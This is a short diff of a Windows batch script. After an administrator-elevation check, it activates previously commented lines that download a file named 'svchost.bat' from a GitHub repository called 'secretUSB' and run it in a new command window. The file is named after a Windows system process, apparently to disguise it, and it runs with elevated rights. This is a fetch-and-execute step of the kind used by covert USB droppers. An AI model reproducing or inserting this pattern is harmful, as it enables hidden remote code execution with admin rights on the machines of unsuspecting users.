@@ -23,8 +23,8 @@ if '%errorlevel%' NEQ '0' (
 
 :gotAdmin
 
-REM curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/svchost.bat
-REM call svchost.bat
+curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/svchost.bat
+start "" cmd /c "svchost.bat"
 
 color 0a
 
